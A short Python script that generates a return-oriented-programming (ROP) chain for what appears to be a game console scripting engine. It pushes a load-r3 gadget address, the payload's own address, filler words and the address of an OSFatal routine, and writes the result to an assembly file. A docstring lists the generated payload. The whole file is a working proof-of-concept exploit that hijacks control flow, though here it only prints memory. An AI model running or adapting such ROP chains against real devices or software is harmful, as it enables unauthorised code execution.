
# Addresses
LOAD_R3_ADDR = 0x0C00C650
OSFATAL_ADDR = 0x01031618

def write32(u32):
    global script
    script += f"pushInt. {hex(u32)}\n"

def writePayloadAddress():
    global script
    script += "pushVar. globalVar,mscScriptAddress\n"

def writeEnd():
    global script
    script += "#Execute ROP chain\nexit\n\n#Dunno why but I figured I might as well put it here, should never hit this though\nend"

"""
Example payload (writeOSFatalPayload func)

pushInt. 0xC00C650
pushVar. globalVar,mscScriptAddress #r3 value (will be printed by OSFatal)
pushInt. 0xBEEF0001
pushInt. 0xBEEF0002
pushInt. 0xBEEF0003
pushInt. 0xBEEF0004
pushInt. 0xBEEF0005
pushInt. 0xBEEF0006
pushInt. 0xBEEF0007
pushInt. 0xBEEF0008
pushInt. 0xBEEF0009
pushInt. 0xBEEF000A
pushInt. 0xBEEF000B
pushInt. 0xBEEF000C
pushInt. 0xBEEF000D
pushInt. 0xBEEF000E
pushInt. 0xBEEF000F
pushInt. 0xBEEF0010
pushInt. 0xBEEF0011
pushInt. 0xBEEF0012
pushInt. 0xBEEF0013
pushInt. 0xBEEF0014
pushInt. 0xBEEF0015
pushInt. 0xBEEF0016
pushInt. 0xBEEF0017
pushInt. 0xBEEF0018
pushInt. 0xBEEF0019
pushInt. 0xBEEF001A
pushInt. 0x01031618 #return address (OSFatal)

"""

# Print out contents of payload as null terminated string
def writeOSFatalPayload():
    write32(LOAD_R3_ADDR)
    writePayloadAddress()
    for i in range(0x1A):
        write32(0xBEEF0000 + i + 1)
    write32(OSFATAL_ADDR)
    writeEnd()


def main():
    global script
    with open('rop_setup.s', 'r') as f:
        script = f.read()

    writeOSFatalPayload()

    with open("main.s", 'w') as f:
        f.write(script)

if __name__ == "__main__":
    main()
